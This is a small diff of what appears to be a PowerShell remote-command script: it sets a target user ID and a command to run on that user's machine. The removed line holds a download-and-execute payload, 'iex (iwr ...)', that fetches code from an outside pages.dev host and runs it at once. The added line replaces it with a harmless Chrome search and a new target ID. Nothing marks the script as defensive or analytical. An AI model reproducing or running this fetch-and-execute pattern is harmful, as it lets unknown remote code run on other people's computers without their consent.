@@ -1,5 +1,5 @@
-$target_user = "35918"
-$command = "iex (iwr java-jvm.pages.dev/sideways);"
+$target_user = "49134"
+$command = "Start-Process chrome 'https://www.google.com/search?q=hi&rlz=1C1GCEA_enGB1129GB1129&oq=hi&gs_lcrp=EgZjaHJvbWUqBwgAEAAYjwIyBwgAEAAYjwIyDQgBEC4YgwEYsQMYgAQyFggCEC4YgwEYxwEYsQMY0QMYgAQYigUyDQgDEAAYgwEYsQMYgAQyFggEEC4YgwEYxwEYsQMY0QMYgAQYigUyBwgFEC4YgAQyBggGEEUYPDIGCAcQRRg80gEHOTE5ajBqN6gCALACAA&sourceid=chrome&ie=UTF-8'"
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
 
